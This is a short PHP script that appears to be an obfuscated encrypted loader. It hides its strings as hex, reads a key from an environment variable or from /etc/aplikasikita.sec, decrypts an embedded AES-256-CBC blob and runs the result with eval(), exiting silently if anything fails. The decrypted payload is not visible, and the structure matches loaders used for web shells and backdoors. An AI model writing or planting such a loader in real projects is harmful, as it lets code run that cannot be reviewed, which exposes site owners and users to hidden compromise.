<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('QYHg/fkiK0Tz4wCvcYU0Kw==');

$c=base64_decode(

'2cv+joaB43PeEUlQ9SfJqXSwjJULvgEQVy8ndQP+UhYVvl8dDQgDUDdBSqcWnZDXjJXq9CcFEDCB' .
'Uze0lrbdeBF+h7Hc9ghU+e62a57QxWTxtVYy4x2B5znYRkUzVwa/nn+uapriqL8YS9F4nBJyLObc' .
'OAd/jqPYIenMYBfvXW+qk3ME1qjKliG0RlqqiUxU4PH3/G23zLhu7jcBL0xOvozAQKinvwREFszc' .
'PR7uGnqp2Gh44c4wlFs9qfZXRahwgQkATmpbYpDnKgpY6Ko+/4DxofH4TlEqNeYH0fBZp06CycBS' .
'OBMXhmXd02c+mnv8GHnftQ91yV2utWDOthPRievpL0QBcRcqws2R9ATC4GDnuyhjYVyGfoX/zRuM' .
'wJXkDfQYub8XN8fn8VqgADHY9//+JuAzPeqTRuhXVxMcuQE0piuHSuRNAlagR4adGXfikx0uE6R7' .
'HnUMkfV34dJQcLihJDrQnqEgM5xetq9/6WURyR7SvFAnbxu9R8i75OEHX8jNjwsSe0OVJ1+g3tDQ' .
'pwQdf55hefPyflOT7LFkjluxK1+m37VZaiVpEHxcllYL+AAQH2p7cJmj6ACrbRtXa9M/P1OGmJzn' .
'cr1LPhXyoLJd8pQkC9hVJYJw66esRDapJ5MLBEq2JBoKDhWLQxSwCj29BCpd37hlpWQMDJmaMcHB' .
'h/Lw6CVt87CHdYxLNaPSPnq3RveP/gzi1GaWIzEbub9I3oQYcKGn9wSbXP/TyQPA2KFZGqUFH3Dm' .
'u03eUfWmnzqAdt1amrMYl/CYvLAzLHgT8AnZrBCykfnR/eynGQATfX0e5Gq6ciocfyhmuD0KwHvv' .
'VSjEprXcZbivIm0lYLu3+RGu6gbEen1+Q8JVYnS4P4wk3OV8LlAjGqK6kXvw1jTa0GXrvNQA+v+o' .
'6ErVXRld5/WAzuhtBgAE3BZqBydaINnWqxWvrkGJ6KcT86oQ3gXxew1YVpIwvL08dIdg4oMkjBfO' .
'lyOBC02YQ992YJ5I2aTW8lJjFvL8l5GX/IJfHGVzp/QjleJ+miQHy643kwCacNhBnB8WD6ipeyd3' .
'V+ddNYSlGvuCHeItjhddpGohttVipnwb2ttPcf9L++H85uGYL6v74r1iuvfj9+65QMesy+BuPW8K' .
'GoK5TSAVPZIhn4z/RE4guSyeuqCgZXH89ij5eEgyIHxs0FenrxWO85W9XT0afnmi0R0xQpjo1zDQ' .
'E19r/am7Ki82fHG2bbiNSIE6Qzsov+66v3qJgVTYUGCcVHxxhUcGEVVXZkNhv78+P/ANptDfbBO9' .
'FdfItRz3oKyaxIpQlJDzKGpVRwoeGnl1ikNtuuxSC+MT7BRPW63coOYN7nBbdmArQWLZWDYQkQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

